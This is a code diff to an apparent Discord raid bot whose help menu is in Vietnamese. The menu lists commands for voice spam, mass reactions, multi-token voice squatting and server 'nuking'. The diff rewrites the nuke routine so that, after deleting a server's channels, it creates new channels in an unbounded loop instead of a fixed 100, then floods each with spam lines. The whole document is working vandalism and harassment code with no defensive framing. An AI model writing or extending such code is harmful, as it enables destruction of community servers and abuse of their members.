@@ -400,7 +400,7 @@ Raid
 .tokenvc [idvoice]                     : Treo voice đa token
 .vcspam [idvoice]                      : Spam join/leave voice
 .massreact [so_tin_nhan] [emoji]       : Thêm phản ứng hàng loạt
-.nuke [server]                         : Xóa kênh + tạo 100 kênh + 300 dòng/kenh
+.nuke [server]                         : Xóa kênh + tạo vô hạn kênh + 300 dòng/kenh
 .overnuke [server]                     : Xả 150 dòng nhay.txt tất cả kênh
 .stop                                 : Dừng tất cả
 ```"""
@@ -1157,10 +1157,12 @@ async def nuke(ctx, server: str):
         text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
         if can_manage:
             nuke_channels = []
-            for i in range(1, 101):
+            i = 1
+            while True:
                 try:
                     ch = await guild.create_text_channel(f"vvnk-nuked-{i}")
                     nuke_channels.append(ch)
+                    i += 1
                 except:
                     break
             text_channels = nuke_channels
